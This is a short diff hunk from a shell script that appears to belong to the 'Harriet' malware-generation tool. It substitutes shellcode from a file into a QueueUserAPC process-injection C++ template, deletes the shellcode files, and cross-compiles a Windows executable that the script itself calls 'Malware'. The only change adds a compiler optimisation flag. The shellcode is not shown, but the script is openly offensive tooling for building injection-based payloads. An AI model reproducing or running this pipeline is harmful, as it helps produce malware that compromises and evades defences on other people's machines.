@@ -85,7 +85,7 @@ Random8=$(cat shell.txt)
 sed -i "s/Random8/$Random8/g" Harriet/QueueUserAPC/Resources/template.cpp
 rm shell*
 echo -e ${yellow}"+++Compiling Malware+++"${clear}
-x86_64-w64-mingw32-g++ -o $MALWARE Harriet/QueueUserAPC/Resources/template.cpp -fpermissive -Wno-narrowing >/dev/null 2>&1
+x86_64-w64-mingw32-g++ -o $MALWARE Harriet/QueueUserAPC/Resources/template.cpp -fpermissive -Wno-narrowing -O2>/dev/null 2>&1
 echo ""
 sleep 2
 echo -e ${yellow}"***Malware Compiled***"${clear}
